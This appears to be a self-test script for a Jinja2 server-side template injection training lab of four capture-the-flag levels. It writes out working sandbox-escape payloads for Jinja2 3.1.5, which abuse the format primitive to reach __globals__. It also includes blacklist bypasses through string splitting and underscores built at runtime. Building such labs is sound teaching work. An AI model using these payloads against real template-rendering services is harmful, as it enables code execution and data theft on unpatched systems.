#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""05-jinja-sandbox 关卡自检 —— 逃逸 payload 必须真的能跑通。

用法（容器内 / 仓库根目录）::

    PYTHONPATH=shared python tests/test_sandbox_levels.py

断言三件事：

1. 当前 Jinja2 落在靶场支持区间内 —— 靶场**精确锁定 `Jinja2==3.1.5`**：
   3.1.4 上 `|attr('format')` 拿到的仍是沙箱包装过的格式化器（原语尚不存在），
   3.1.6 起 CVE-2025-27516 已修复；两个方向都会让四关全部无解；
2. 每一关 README 里写的**参考解 payload** 经 ``Level.render(...)`` 得到预期结果；
3. 被拦的写法（经典 ``|attr`` 链、被 WAF 命中的关键字）**确实**失败。

本文件**故意**不放进 CI 的快速单元任务：CI 装的是最新 Jinja2（≥3.1.6），
第 1 条断言必然打红。它应该在 ``labs/05-jinja-sandbox`` 的镜像里跑，
或用 ``pip install 'Jinja2==3.1.5'`` 后的环境跑。
"""

from __future__ import annotations

import importlib.util
import os
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "shared"))

# flag 不碰真实 /flag：先固定环境，再导入 ssti_core
_TMP = Path(tempfile.mkdtemp(prefix="ssti-sandbox-test-"))
os.environ["FLAG_PATH"] = str(_TMP / "flag")
os.environ["STATIC_FLAG"] = "flag{sandbox_self_test}"
os.environ.pop("SSTI_ECHO_DIR", None)

from ssti_core import flagutil  # noqa: E402

FAILURES: list[str] = []
CHECKS = 0


def check(name: str, cond: bool, detail: str = "") -> None:
    global CHECKS
    CHECKS += 1
    if cond:
        print(f"  ok   {name}")
    else:
        print(f"  FAIL {name}  {detail}")
        FAILURES.append(name)


def load_lab_app():
    """按路径导入 05 的 app.py —— 顺便验证它注册沙箱 globals 的那段逻辑。"""
    path = ROOT / "labs" / "05-jinja-sandbox" / "app.py"
    spec = importlib.util.spec_from_file_location("lab05_app", path)
    module = importlib.util.module_from_spec(spec)
    sys.modules["lab05_app"] = module
    spec.loader.exec_module(module)
    return module


def main() -> int:
    flagutil.write_flag_file()
    flag = flagutil.read_flag_file()

    lab = load_lab_app()
    levels = {lv.level_id: lv for lv in lab.LEVELS}

    print(f"[0] 运行时版本（jinja2={lab.JINJA2_VERSION}，需要 {lab.JINJA2_MIN}~<{lab.JINJA2_MAX_EXCLUSIVE}）")
    check(
        f"Jinja2 {lab.JINJA2_VERSION} 在支持区间内（逃逸原语 {lab.CVE} 未被修复）",
        lab.ESCAPE_AVAILABLE,
        "版本漂移：请 pip install 'Jinja2>=3.1.4,<3.1.6'",
    )
    if not lab.ESCAPE_AVAILABLE:
        print("\n版本不对，后续断言没有意义，直接退出。")
        print(f"共 {CHECKS} 项，失败 {len(FAILURES)} 项")
        return 1

    check("关卡数 = 4", len(levels) == 4, str(sorted(levels)))
    check(
        "四关都用 jinja_sandbox 渲染器",
        all(lv.renderer_key == "jinja_sandbox" for lv in levels.values()),
    )
    check("L1/L3/L4 是默认沙箱，L2 是 immutable",
          levels["0"].options.get("sandbox") in (None, "default")
          and levels["1"].options.get("sandbox") == "immutable"
          and levels["2"].options.get("sandbox") in (None, "default")
          and levels["3"].options.get("sandbox") in (None, "default"))
    check("sandbox 已注册进关卡表", lab.LEVELS[0] is not None)

    # ---------------------------------------------------------------- L1
    print("\n[1] L1（id 0）默认沙箱：经典链被拦 + format 原语逃逸")
    l1 = levels["0"]

    r = l1.render("{{ ''|attr('__class__') }}")
    check("沙箱拦下 |attr('__class__')（渲染成空串）",
          r.error is None and r.practice_output.strip() == "", repr(r.practice_output))

    naive = "{{ ()|attr('__class__')|attr('__base__')|attr('__subclasses__')() }}"
    r = l1.render(naive)
    check("经典 |attr 链确实失败（抛异常，不是 WAF）",
          r.error is not None and not r.waf_blocked, f"error={r.error!r}")

    r = l1.render("{{ ('{0.__class__}'|attr('format'))(()) }}")
    check("逃逸证明：格式字段名拿到 <class 'tuple'>",
          "<class 'tuple'>" in r.practice_output, repr(r.practice_output))

    payload_l1 = "{{ ('{0.__globals__[SITEDATA][flag]}'|attr('format'))(helper) }}"
    r = l1.render(payload_l1)
    check("参考解拿到 flag", r.practice_output.strip() == flag, repr(r.practice_output[:120]))
    check("框架的 flag 判定为真", flagutil.flag_found_in(r.practice_output))

    # ---------------------------------------------------------------- L2
    print("\n[2] L2（id 1）不可变沙箱：只多挡「修改」，逃逸照旧")
    l2 = levels["1"]
    check("L2 用 ImmutableSandboxedEnvironment", l2.options.get("sandbox") == "immutable")

    r1 = l1.render("{{ [1,2,3].append(4) }}")
    r2 = l2.render("{{ [1,2,3].append(4) }}")
    check("默认沙箱允许修改 list（append 返回 None，渲染成 None）",
          r1.error is None and r1.practice_output.strip() == "None", repr(r1.practice_output))
    check("不可变沙箱拒绝修改 list（SecurityError）",
          r2.exception_type == "SecurityError", repr(r2.error))

    r = l2.render(payload_l1)
    check("L1 的逃逸 payload 在 L2 一字不改仍然成立",
          r.practice_output.strip() == flag, repr(r.practice_output[:120]))

    # ---------------------------------------------------------------- L3
    print("\n[3] L3（id 2）关键字子串黑名单：拆开再拼")
    l3 = levels["2"]
    r = l3.render("{{ ('{0.__globals__}'|attr('format'))(helper) }}")
    check("含 globals 的载荷被 WAF 拦下", r.practice_output == "WAF" and r.waf_blocked)

    payload_l3 = "{{ (('{0.__glo'~'bals__[SITEDATA][fl'~'ag]}')|attr('for'~'mat'))(helper) }}"
    r = l3.render(payload_l3)
    check("L3 参考解拿到 flag", r.practice_output.strip() == flag, repr(r.practice_output[:120]))
    r = l3.render("{{ (('{0.__cla'~'ss__}')|attr('for'~'mat'))(()) }}")
    check("L3 类名证明（拆 class）", "<class 'tuple'>" in r.practice_output, repr(r.practice_output))

    # ---------------------------------------------------------------- L4
    print("\n[4] L4（id 3）字符黑名单 `_`：运行期造下划线")
    l4 = levels["3"]
    check("L4 的 WAF 是字符黑名单 _",
          l4.waf.chars == ("_",) and l4.waf.kind == "chars", str(l4.waf.to_json()))
    r = l4.render("{{ '__globals__' }}")
    check("含 _ 的载荷被 WAF 拦下", r.practice_output == "WAF" and r.waf_blocked)

    u = "'%c'|format(95)"
    payload_l4 = (
        "{{ (('{0.'~" + u + "~" + u + "~'globals'~" + u + "~" + u
        + "~'[SITEDATA][flag]}')|attr('format'))(helper) }}"
    )
    check("L4 参考解 payload 里不含字符 _", "_" not in payload_l4)
    r = l4.render(payload_l4)
    check("L4 参考解拿到 flag", r.practice_output.strip() == flag, repr(r.practice_output[:120]))

    r = l4.render("{{ '%c'|format(95) }}")
    check("下划线原语：'%c'|format(95) == '_'", r.practice_output == "_", repr(r.practice_output))

    print()
    print(f"共 {CHECKS} 项，失败 {len(FAILURES)} 项")
    if FAILURES:
        print("失败项：" + ", ".join(FAILURES))
        return 1
    print("沙箱 4 关的参考解与被拦写法全部验证通过 ✅")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
